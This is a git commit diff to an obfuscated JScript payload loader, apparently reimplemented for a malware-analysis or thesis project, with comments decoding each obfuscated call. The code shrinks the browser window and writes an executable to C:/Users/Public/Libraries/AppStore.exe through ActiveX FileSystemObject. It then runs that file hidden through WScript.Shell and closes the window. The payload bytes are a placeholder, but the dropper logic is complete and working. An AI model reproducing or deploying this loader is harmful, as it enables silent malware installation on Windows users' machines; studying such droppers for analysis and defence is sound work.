67813a17a87040dbfaeed55190d1236c55da6d3c
Samuel Sulovsky <samuel.sulovsky@gmail.com>
2022-05-28 20:49:03 +0200

    Final touches and screenshots of JS payload

--- implementation/src/payload_loader/payload.js
+++ implementation/src/payload_loader/payload.js
@@ -7,9 +7,9 @@ var _0x4fba = [
 
 // Pointless second argument for obfuscation
 var _0x187d = function(_0x1d5195, _0x59a857) {
-  _0x1d5195 = _0x1d5195 - 0x1dc
-  var _0x4fbae6 = _0x4fba[_0x1d5195]
-  return _0x4fbae6 
+  _0x1d5195 = _0x1d5195 - 0x1dc;
+  var _0x4fbae6 = _0x4fba[_0x1d5195];
+  return _0x4fbae6;
 }
 
 var _0x556975 = _0x187d // Function alias
@@ -19,7 +19,7 @@ var _0x556975 = _0x187d // Function alias
 // arg2: the value 0x6d993 == 448915
 // result: 
 (function(_0x284e13, _0x5d8387) {
-  var _0x113863 = _0x187d // Function alias
+  var _0x113863 = _0x187d; // Function alias
   // Reorders the array elements until they are in the order:
   // [
   //  fromCharCode, C:/Users/Public/Libraries/AppStore.exe,
@@ -34,36 +34,36 @@ var _0x556975 = _0x187d // Function alias
         * parseInt(_0x113863(0x1e8)) + parseInt(_0x113863(0x1de))
         + parseInt(_0x113863(0x1e6)) + -parseInt(_0x113863(0x1ed))
         + -parseInt(_0x113863(0x1e1)) * -parseInt(_0x113863(0x1e5))
-        + parseInt(_0x113863(0x1e9)) * parseInt(_0x113863(0x1e0))
-      if (_0x589f0d === _0x5d8387) break
-      else _0x284e13['push'](_0x284e13['shift']()) // places first element at the back of arr
+        + parseInt(_0x113863(0x1e9)) * parseInt(_0x113863(0x1e0));
+      if (_0x589f0d === _0x5d8387) break;
+      else _0x284e13['push'](_0x284e13['shift']()); // places first element at the back of arr
     } catch (_0xecf87d) {
       // the error path ultimately does the same as the 
       // normal path if _0x589f0d != _0x5d8387 (second arg)
-      _0x284e13['push'](_0x284e13['shift']()) // places first element at the back of arr
+      _0x284e13['push'](_0x284e13['shift']()); // places first element at the back of arr
     }
   }
-}(_0x4fba, 0x6d993), window[_0x556975(0x1ea)](0x0, 0x0)) // Calls window.resizeTo(0, 0)
+}(_0x4fba, 0x6d993), window[_0x556975(0x1ea)](0x0, 0x0)); // Calls window.resizeTo(0, 0)
 
 try {
   var b = new ActiveXObject('Scripting.FileSystemObject'),
-    d = _0x556975(0x1dd) // d = 'C:/Users/Public/Libraries/AppStore.exe'
+    d = _0x556975(0x1dd); // d = 'C:/Users/Public/Libraries/AppStore.exe'
 
   e = b[_0x556975(0x1e4)](d, !![]), //call Scripting.FileSystemObject.CreateTextFile(path, true)
     e[_0x556975(0x1ec)]('MZ'), // call Write('MZ') on the created file
-    e['CLose']() // close the file
+    e['Close'](); // close the file
   var data = [144, 3, 0, 4, 0, 65535, 0, 184], // replace with payload
-      i, len
-  len = data['length']
-  var content = ''
+      i, len;
+  len = data['length'];
+  var content = '';
   for (i = 0x0; i < len; i++) {
-    content += String[_0x556975(0x1dc)](data[i]) // content += String.fromCharCode(data[i])
+    content += String[_0x556975(0x1dc)](data[i]); // content += String.fromCharCode(data[i])
   }
   e = b[_0x556975(0x1e3)](d, 0x8, ![], -0x1), // call Scripting.FileSystemObject.OpenTextFile(path, 8, false, -1)
     e[_0x556975(0x1ec)](content), // call Write(content) on the opened file
-    e[_0x556975(0x1eb)]() // close the file
-  var c = new ActiveXObject('WScript.Shell')
-  c['Run'](d, 0x0) // run the payload
+    e[_0x556975(0x1eb)](); // close the file
+  var c = new ActiveXObject('WScript.Shell');
+  c['Run'](d, 0x0); // run the payload
   
 } catch (_0x1f5265) {}
 window[_0x556975(0x1e7)](); // window.close()
